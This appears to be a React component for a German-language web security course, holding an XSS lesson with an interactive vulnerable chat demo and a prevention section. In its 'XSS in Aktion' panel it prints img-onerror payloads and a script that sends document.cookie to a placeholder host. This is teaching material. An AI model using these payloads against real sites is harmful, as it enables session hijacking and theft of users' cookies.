import { useState, useEffect } from "react";
import Accordion from "@mui/material/Accordion";
import AccordionSummary from "@mui/material/AccordionSummary";
import AccordionDetails from "@mui/material/AccordionDetails";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import LinearProgress from "@mui/material/LinearProgress";
import { createTheme, ThemeProvider } from "@mui/material/styles";
import { Box, Typography } from "@mui/material";
import XSSChat from "../components/XSSChat";
import { Link } from "react-router";
import { MdNavigateNext, MdNavigateBefore } from "react-icons/md";

// StepCircle-Komponente zur konsistenten Darstellung der Schritt-Zahlen
const StepCircle = ({ number }) => (
  <Box
    sx={{
      width: 40,
      height: 40,
      backgroundColor: "#1976d2",
      color: "#fff",
      borderRadius: "50%",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontWeight: "bold",
      fontSize: "1rem",
      flexShrink: 0,
    }}
  >
    {number}
  </Box>
);

export default function AccordionXSS() {
  // Gesamtzahl der Accordions
  const totalAccordions = 4;

  // Zustand: Array, ob das jeweilige Accordion aktuell geöffnet ist
  const [expandedStates, setExpandedStates] = useState(
    Array(totalAccordions).fill(false)
  );

  // Zustand: Array, ob das jeweilige Accordion mindestens einmal geöffnet wurde
  const [everOpened, setEverOpened] = useState(
    Array(totalAccordions).fill(false)
  );

  // Fortschritt in Prozent berechnen anhand der Panels, die mindestens einmal geöffnet wurden
  const openedCount = everOpened.filter(Boolean).length;
  const progress = (openedCount / totalAccordions) * 100;

  useEffect(() => {
    // Scrollt die Seite bei jedem Mount der Komponente nach oben
    window.scrollTo(0, 0);
  }, []);

  // Funktion, um einen bestimmten Accordion-Zustand zu toggeln
  const handleToggle = (index) => (event, isExpanded) => {
    setExpandedStates((prev) => {
      const newState = [...prev];
      newState[index] = isExpanded;
      return newState;
    });
    if (isExpanded) {
      setEverOpened((prev) => {
        const newOpened = [...prev];
        newOpened[index] = true;
        return newOpened;
      });
    }
  };

  const theme = createTheme({
    typography: {
      fontFamily: '"Inter", sans-serif', // Setzt "Inter" als Standard-Schriftart
    },
    components: {
      MuiAccordion: {
        styleOverrides: {
          root: {
            "&:first-of-type": {
              borderTopLeftRadius: 0,
              borderTopRightRadius: 0,
            },
            "&:last-of-type": {
              borderBottomLeftRadius: 0,
              borderBottomRightRadius: 0,
            },
            borderRadius: 0,
            boxShadow: "rgba(99, 99, 99, 0.2) 0px 2px 8px 0px",
            marginBottom: "8px", // Abstand zwischen den Accordions
          },
        },
      },
    },
  });

  return (
    <div className="flex flex-col items-center p-8 bg-gradient-to-r from-[#f9fcff] to-sky-100 min-h-screen">
      <ThemeProvider theme={theme}>
        {/* Fortschrittsbalken */}
        <LinearProgress
          variant="determinate"
          value={progress}
          sx={{ mb: 2, width: "100%", maxWidth: 800 }}
        />

        {/* Accordion 1: Grundlagen */}
        <Accordion
          expanded={expandedStates[0]}
          onChange={handleToggle(0)}
          sx={{ width: "100%", maxWidth: 800 }}
        >
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1-content"
            id="panel1-header"
          >
            <Typography variant="h6">XSS: Grundlagen</Typography>
          </AccordionSummary>
          <AccordionDetails>
            <Typography paragraph>
              Cross-Site-Scripting (XSS) ist eine Code-Schwachstelle, die
              auftritt, wenn ein Angreifer bösartigen Code (meist JavaScript) in
              eine ansonsten vertrauenswürdige Webseite einschleusen kann. Der
              eingeschleuste Code wird im Browser anderer Benutzer ausgeführt,
              sodass sensible Informationen wie Cookies oder Session-Daten
              abgegriffen werden können oder die Darstellung der Webseite
              manipuliert wird.
            </Typography>
            <Typography variant="h6" gutterBottom>
              Was du lernen wirst
            </Typography>
            <Typography paragraph>
              In dieser Lektion werden wir demonstrieren, wie ein XSS-Angriff in
              einer Chat-Anwendung ablaufen kann. Anschließend gehen wir auf die
              verschiedenen Angriffsvektoren von XSS ein und untersuchen den
              anfälligen Code, um zu verstehen, wie solche Angriffe
              funktionieren – und wie man sie verhindern kann.
            </Typography>

            {/* Einführung der drei XSS-Typen */}
            <Typography variant="h6" gutterBottom>
              Die drei Hauptarten von XSS
            </Typography>
            <Typography paragraph>
              Es gibt drei Hauptarten von Cross-Site Scripting (XSS), die
              jeweils auf unterschiedliche Weise auftreten:
            </Typography>
            <Typography variant="subtitle1" gutterBottom>
              <strong>1. Stored XSS (Gespeichertes XSS):</strong>
            </Typography>
            <Typography paragraph>
              Bei Stored XSS werden bösartige Skripte dauerhaft auf dem
              Zielserver gespeichert, beispielsweise in einer Datenbank, einem
              Forum, einem Gästebuch oder einem Kommentarbereich. Wenn ein
              Benutzer die betroffene Seite aufruft, wird das gespeicherte
              Skript zusammen mit den legitimen Daten ausgeführt.
            </Typography>
            <Typography variant="subtitle1" gutterBottom>
              <strong>2. Reflected XSS (Reflektiertes XSS):</strong>
            </Typography>
            <Typography paragraph>
              Reflected XSS tritt auf, wenn ein bösartiger Code über eine
              manipulierte URL oder einen Formularparameter an die Anwendung
              gesendet und sofort in der Antwort reflektiert wird, ohne
              ordnungsgemäß gefiltert zu werden. Diese Art von XSS wird oft in
              Phishing-Angriffen verwendet.
            </Typography>
            <Typography variant="subtitle1" gutterBottom>
              <strong>3. DOM-based XSS (DOM-basiertes XSS):</strong>
            </Typography>
            <Typography paragraph>
              DOM-based XSS entsteht, wenn bösartiger Code durch Manipulation
              des Document Object Model (DOM) im Browser ausgeführt wird, ohne
              dass der Server die Daten verarbeitet. Diese Art von XSS hängt
              stark von der Client-seitigen Logik ab und kann schwerer zu
              erkennen und zu verhindern sein.
            </Typography>
          </AccordionDetails>
        </Accordion>

        {/* Accordion 2: XSS in Aktion */}
        <Accordion
          expanded={expandedStates[1]}
          onChange={handleToggle(1)}
          sx={{ width: "100%", maxWidth: 800 }}
        >
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel2-content"
            id="panel2-header"
          >
            <Typography variant="h6">XSS in Aktion</Typography>
          </AccordionSummary>
          <AccordionDetails>
            <Typography variant="h6" gutterBottom>
              Beispiele aus der Praxis
            </Typography>
            <Box sx={{ maxHeight: 200, overflow: "auto", mb: 2 }}>
              <Typography paragraph>
                <strong>Fortnite (Anfang 2019):</strong> Fortnite, eines der
                weltweit erfolgreichsten Online-Spiele, rückte zu Beginn des
                Jahres 2019 ins Visier von Angreifern. Sicherheitsforscher
                entdeckten eine XSS-Schwachstelle, mit der auf Spielerkonten
                zugegriffen, vertrauliche Informationen eingesehen und virtuelle
                Währung entwendet werden konnten. Durch einen diskreten Hinweis
                wurde die Lücke rechtzeitig geschlossen.
              </Typography>
              <Typography paragraph>
                <strong>British Airways (2018):</strong> British Airways wurde
                Opfer einer groß angelegten Datenpanne, bei der Angreifer über
                eine XSS-Schwachstelle Kundendaten abgriffen konnten. Die
                Hackergruppe Magecart nutzte hierbei den fehlerhaften Umgang mit
                einer JavaScript-Bibliothek, um schädlichen Code einzuschleusen.
              </Typography>
            </Box>
            <Typography variant="h6" gutterBottom>
              Anfällige Chats
            </Typography>
            <Typography paragraph>
              Ein Unternehmen namens bibfi.io hat einen internen Chat-Dienst
              entwickelt. Dabei wurde versehentlich ein XSS-fähiger Code
              implementiert, der es Angreifern ermöglicht, beispielsweise die
              Hintergrundfarbe des Chats zu ändern oder einen simulierten
              Cookie-Erhalt anzuzeigen.
            </Typography>
            <Typography variant="h6" gutterBottom>
              Hack: Ändere die Hintergrundfarbe des Chats
            </Typography>
            <XSSChat />
            <Typography paragraph>
              Sende folgende Nachricht, um den Chat-Hintergrund rot zu färben:
            </Typography>
            <Box
              component="pre"
              sx={{
                fontFamily: "monospace",
                border: "1px solid #ccc",
                padding: "12px",
                borderRadius: "4px",
                backgroundColor: "#f4f4f4",
                mb: 2,
                whiteSpace: "pre-wrap",
              }}
            >
              {`<img src="gibtesnicht.jpg" 
onerror="document.querySelector('.chat-box').style.backgroundColor='red';" />`}
            </Box>
            <Typography paragraph>
              Durch das Ausführen von JavaScript in der Nachricht wird die
              Darstellung des Chats manipuliert. Dies zeigt, wie gefährlich
              unkontrolliertes Rendering von Benutzereingaben sein kann.
            </Typography>
            <Typography variant="h6" gutterBottom>
              Hack: Simulierter Cookie-Erhalt
            </Typography>
            <Typography paragraph>
              Die Veränderung der Hintergrundfarbe ist zwar hauptsächlich ein
              optisches Problem und eher harmlos, doch das Auslesen von Cookies
              stellt ein viel gravierenderes Sicherheitsrisiko dar. Cookies
              enthalten oft sensible Daten wie Sitzungs-IDs,
              Authentifizierungsinformationen oder Benutzerpräferenzen.
            </Typography>
            <Typography paragraph>
              Ein Angreifer, der Zugang zu den Cookies eines Benutzers erhält,
              könnte dessen Sitzung übernehmen (Session Hijacking), persönliche
              Daten stehlen oder sich unberechtigt als dieser Benutzer ausgeben.
            </Typography>
            <Typography paragraph>
              Sende folgenden Code, um im Chat eine simulierte Cookie-Nachricht
              anzuzeigen:
            </Typography>
            <Box
              component="pre"
              sx={{
                fontFamily: "monospace",
                border: "1px solid #ccc",
                padding: "12px",
                borderRadius: "4px",
                backgroundColor: "#f4f4f4",
                mb: 2,
                whiteSpace: "pre-wrap",
              }}
            >
              {`<img src="nonexistent.jpg" 
onerror="window.simulateXSSCookieSteal()" />`}
            </Box>
            <Typography paragraph>
              Hinweis: Es wird hierbei kein echter Cookie ausgelesen – lediglich
              eine fiktive Nachricht eingeblendet.
            </Typography>
            <Typography paragraph>
              In diesem Beispiel haben wir eine JavaScript-Payload erstellt, die
              die Cookies an den Chat übermittelt. Der Chat-Partner würde
              schnell bemerken, dass etwas nicht stimmt. In einem
              realistischeren Szenario möchte man seine Aktivitäten
              unauffälliger gestalten. Statt die Cookies direkt in den Chat
              sichtbar zu machen, könnte man beispielsweise folgende Nachricht
              senden:
            </Typography>
            <Box
              component="pre"
              sx={{
                fontFamily: "monospace",
                border: "1px solid #ccc",
                padding: "12px",
                borderRadius: "4px",
                backgroundColor: "#f4f4f4",
                mb: 2,
                whiteSpace: "pre-wrap",
              }}
            >
              {`<script>new Image().src="http://yourdomain.com/"+document.cookie;</script>`}
            </Box>
            <Typography paragraph>
              Dieses Skript erstellt ein unsichtbares Image-Objekt, das sofort
              beim Erstellen eine HTTP-Anfrage an die angegebene URL absetzt –
              wobei der Inhalt der Cookies an die URL angehängt wird. So können
              unauffällig die Cookie-Daten gesammelt werden.
            </Typography>
          </AccordionDetails>
        </Accordion>

        {/* Accordion 3: XSS hinter den Kulissen */}
        <Accordion
          expanded={expandedStates[2]}
          onChange={handleToggle(2)}
          sx={{ width: "100%", maxWidth: 800 }}
        >
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel3-content"
            id="panel3-header"
          >
            <Typography variant="h6">XSS hinter den Kulissen</Typography>
          </AccordionSummary>
          <AccordionDetails>
            <Box sx={{ display: "flex", flexDirection: "column", gap: 4 }}>
              <Typography variant="h6" gutterBottom>
                Wie funktioniert die XSS-Injection?
              </Typography>

              {/* Schritt 1 */}
              <Box sx={{ display: "flex", alignItems: "center", gap: 3 }}>
                <StepCircle number={1} />
                <Box>
                  <Typography variant="subtitle1" gutterBottom>
                    <strong>Originales HTML-Rendering:</strong>
                  </Typography>
                  <Box
                    component="pre"
                    sx={{
                      backgroundColor: "#f5f5f5",
                      padding: 2,
                      borderRadius: 2,
                      overflow: "auto",
                      fontFamily: "monospace",
                      whiteSpace: "pre-wrap",
                    }}
                  >
                    {`<input type="text" value="Hallo!" />`}
                  </Box>
                </Box>
              </Box>

              {/* Schritt 2 */}
              <Box sx={{ display: "flex", alignItems: "center", gap: 3 }}>
                <StepCircle number={2} />
                <Box>
                  <Typography variant="subtitle1" gutterBottom>
                    <strong>
                      Angreifer gibt bösartigen Code in das Eingabefeld ein:
                    </strong>
                  </Typography>
                  <Box
                    component="pre"
                    sx={{
                      backgroundColor: "#ffe0b2",
                      padding: 2,
                      borderRadius: 2,
                      overflow: "auto",
                      fontFamily: "monospace",
                      whiteSpace: "pre-wrap",
                    }}
                  >
                    {`<img src="invalid.jpg" onerror="stealCookies()" />`}
                  </Box>
                  <Typography>
                    Der Angreifer tippt statt eines harmlosen Textes diesen Code
                    in das Eingabefeld. Wenn die Anwendung diesen Text
                    ungefiltert speichert und bei der Anzeige zurück auf die
                    Seite rendert, kann das
                    <code>&lt;img&gt;</code>-Tag ausgeführt werden.
                  </Typography>
                </Box>
              </Box>

              {/* Schritt 3 */}
              <Box sx={{ display: "flex", alignItems: "center", gap: 3 }}>
                <StepCircle number={3} />
                <Box>
                  <Typography variant="subtitle1" gutterBottom>
                    <strong>Modifiziertes HTML durch Injection:</strong>
                  </Typography>
                  <Box
                    component="pre"
                    sx={{
                      backgroundColor: "#f5f5f5",
                      padding: 2,
                      borderRadius: 2,
                      overflow: "auto",
                      fontFamily: "monospace",
                      whiteSpace: "pre-wrap",
                    }}
                  >
                    {`<input type="text" value="Hallo!" />
<!-- Der bösartige Code -->
<img src="invalid.jpg" onerror="stealCookies()" />`}
                  </Box>
                  <Typography>
                    Im schlimmsten Fall fügt die Anwendung den eingegebenen Code
                    direkt ins DOM ein. Das führt dazu, dass neben dem
                    ursprünglichen Eingabefeld auch das neue <code>img</code>
                    -Tag gerendert wird.
                  </Typography>
                </Box>
              </Box>

              {/* Schritt 4 */}
              <Box sx={{ display: "flex", alignItems: "center", gap: 3 }}>
                <StepCircle number={4} />
                <Box>
                  <Typography variant="subtitle1" gutterBottom>
                    <strong>Auswirkung der modifizierten Abfrage:</strong>
                  </Typography>
                  <Typography gutterBottom>
                    Da das Bild <code>invalid.jpg</code> nicht geladen werden
                    kann, löst der Browser das <code>onerror</code>-Ereignis
                    aus. Dadurch wird die Funktion <code>stealCookies()</code>{" "}
                    aufgerufen, die im schlimmsten Fall die Cookies des
                    Benutzers an den Angreifer sendet.
                  </Typography>
                  <Typography>
                    <strong>Wichtig:</strong> XSS-Code kann auch auf einem
                    Server gespeichert werden – zum Beispiel in einer Datenbank
                    oder als Kommentar/Chat-Nachricht. Wenn andere Benutzer
                    diese Seite aufrufen und das fehlerhafte Bild vom Server
                    geladen wird, wird das
                    <code> onerror</code>-Ereignis auch in ihren Browsern
                    ausgelöst. So kann der Angriff viele Nutzer gleichzeitig
                    betreffen (Stored XSS).
                  </Typography>
                </Box>
              </Box>
            </Box>
          </AccordionDetails>
        </Accordion>

        {/* Accordion 4: Wie kann man XSS verhindern? */}
        <Accordion
          expanded={expandedStates[3]}
          onChange={handleToggle(3)}
          sx={{ width: "100%", maxWidth: 800 }}
        >
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel4-content"
            id="panel4-header"
          >
            <Typography variant="h6">Wie kann man XSS verhindern?</Typography>
          </AccordionSummary>
          <AccordionDetails>
            <Typography paragraph>
              Es gibt mehrere Maßnahmen, um XSS-Angriffe zu verhindern:
            </Typography>
            <Box component="ul" sx={{ listStyleType: "disc", pl: 4, mb: 2 }}>
              <Box component="li" sx={{ mb: 1 }}>
                <Typography component="span" sx={{ fontWeight: "bold" }}>
                  Validierung:
                </Typography>{" "}
                Überprüfe, ob die eingegebenen Daten dem erwarteten Format
                entsprechen.
                <br />
                <em>Beispiel:</em> Stelle sicher, dass ein E-Mail-Feld nur
                Zeichen enthält, die in einer E-Mail-Adresse zulässig sind, z.
                B. mit einem Regex wie{" "}
                <code>/^[\w-\.]+@([\w-]+\.)+[\w-]{(2, 4)}$/</code>.
              </Box>
              <Box component="li" sx={{ mb: 1 }}>
                <Typography component="span" sx={{ fontWeight: "bold" }}>
                  Escaping:
                </Typography>{" "}
                Wandle potenziell gefährliche Zeichen (z. B. <code>&lt;</code>,{" "}
                <code>&gt;</code>, <code>"</code>, <code>'</code>) in ihre
                HTML-Entities um, sodass sie nicht als HTML bzw. JavaScript
                interpretiert werden.
                <br />
                <em>Beispiel:</em> Verwende Funktionen wie{" "}
                <code>htmlspecialchars()</code> in PHP oder Bibliotheken wie
                DOMPurify in JavaScript.
              </Box>
              <Box component="li" sx={{ mb: 1 }}>
                <Typography component="span" sx={{ fontWeight: "bold" }}>
                  Content Security Policy (CSP):
                </Typography>{" "}
                Definiere, welche Skriptquellen erlaubt sind, um nicht
                autorisierte Skripte zu blockieren.
                <br />
                <em>Beispiel:</em> Setze den HTTP-Header{" "}
                <code>
                  Content-Security-Policy: script-src 'self'
                  https://vertrauenswuerdige-seiten.de;
                </code>
                .
              </Box>
              <Box component="li" sx={{ mb: 1 }}>
                <Typography component="span" sx={{ fontWeight: "bold" }}>
                  Verwendung sicherer Frameworks:
                </Typography>{" "}
                Moderne Frameworks escapen standardmäßig dynamische Inhalte.
                <br />
                <em>Beispiel:</em> In React wird der Inhalt automatisch als
                reiner Text behandelt.
              </Box>
            </Box>
            <Typography paragraph>
              Durch diese Maßnahmen wird sichergestellt, dass eingeschleuster
              Code nicht als ausführbarer Code interpretiert wird – was einen
              effektiven Schutz vor XSS-Angriffen darstellt.
            </Typography>
          </AccordionDetails>
        </Accordion>
      </ThemeProvider>

      {/* Navigationsbuttons */}
      <Box sx={{ display: "flex", gap: 2, mt: 4 }}>
        <Link
          to="/"
          className="bg-sky-600 hover:bg-sky-800 transition-all text-white p-3 h-12 flex items-center justify-center gap-2 w-44"
        >
          <MdNavigateBefore size={24} style={{ marginRight: "8px" }} />
          Zurück
        </Link>
        <Link
          to="/sql-injection"
          className="bg-sky-600 hover:bg-sky-800 transition-all text-white p-3 h-12 flex items-center justify-center gap-2"
        >
          Nächste Lektion
          <MdNavigateNext size={24} style={{ marginLeft: "8px" }} />
        </Link>
      </Box>
    </div>
  );
}
